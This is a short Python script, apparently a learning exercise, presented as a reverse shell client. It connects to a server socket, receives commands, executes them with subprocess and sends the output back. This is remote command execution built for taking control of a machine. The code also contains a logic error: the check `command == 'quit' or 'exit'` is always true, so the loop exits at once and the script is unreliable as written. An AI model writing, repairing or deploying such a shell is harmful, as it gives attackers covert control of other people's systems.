# Reverse Shell Program that works as a client
import socket
import subprocess

# Variables for Host Details
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 80
BUFFER_SIZE = 1024

# Create Socket
s = socket.socket()
# Connect to Server Host
s.connect((SERVER_HOST, SERVER_PORT))

# Receive default message from Server
# message = s.recv(BUFFER_SIZE).decode()
# print(f"Serve Said: ", message)

while True:
    # Receive Commands from Server
    command = s.recv(BUFFER_SIZE).decode()

    if command == "quit" or "exit":
        # Break Connection or quit program if exit command is received
        break
    # Execute received command and return output to be sent back to the server
    output = subprocess.getoutput(command)
    # Send output back to server
    s.send(output.encode())

# Close Client connection
s.close()